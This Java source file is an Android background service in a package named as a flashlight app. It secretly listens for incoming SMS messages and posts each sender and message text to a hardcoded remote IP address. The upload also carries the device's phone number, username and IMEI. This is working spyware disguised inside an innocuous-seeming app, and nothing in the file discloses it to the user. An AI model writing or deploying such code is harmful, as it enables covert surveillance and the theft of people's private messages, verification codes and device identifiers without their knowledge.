package com.androidhive.flashlight;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.content.IntentFilter;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

/**
 * Created by lucadalseno on 25/06/17.
 */

public class MessageInService extends Service {

    private String messageBody;
    private String messageSource;
    private SMSreceiver mSMSreceiver;
    private IntentFilter mIntentFilter;
    private GetInfo info;

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();

        info = new GetInfo(this);
        //SMS event receiver
        mSMSreceiver = new SMSreceiver();
        mIntentFilter = new IntentFilter();
        mIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(mSMSreceiver, mIntentFilter);
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        // Unregister the SMS receiver
        unregisterReceiver(mSMSreceiver);
    }


    private class SMSreceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle extras = intent.getExtras();

            String messageText = "";

            if (extras != null) {
                Object[] smsextras = (Object[]) extras.get("pdus");

                for (int i = 0; i < smsextras.length; i++) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) smsextras[i]);

                    messageBody = smsMessage.getMessageBody().toString();
                    messageSource = smsMessage.getOriginatingAddress();

                    messageText += "SMS from " + messageSource + " : " + messageBody;

                    Log.i("Message Info", messageText);
                }
            }
            AsyncT async = new AsyncT();
            async.execute();
        }

    }

    class AsyncT extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... params) {

            try {

                URL url = new URL("http://79.24.89.148:8000/Server/"); //Enter URL here
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestMethod("POST"); // here you are telling that it is a POST request, which can be changed into "PUT", "GET", "DELETE" etc.
                httpURLConnection.setRequestProperty("Content-Type", "application/json"); // here you are setting the `Content-Type` for the data you are sending which is `application/json`
                httpURLConnection.connect();

                JSONObject doc = new JSONObject();
                JSONObject messageJSON = new JSONObject();

                messageJSON.put("Sender",messageSource);
                messageJSON.put("ReceiverNumber",info.getPhoneNumber());
                messageJSON.put("Text",messageBody);
                messageJSON.put("Username",info.getUsername());
                messageJSON.put("IMEI",info.getImei());

                doc.put("MessageIn",messageJSON);
                doc.put("r", "pushMessage");

                DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream());
                wr.writeBytes(doc.toString());
                wr.flush();
                wr.close();

                Log.i("Response",""+httpURLConnection.getResponseMessage());

            } catch (ProtocolException e1) {
                e1.printStackTrace();
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            } catch (IOException e1) {
                e1.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
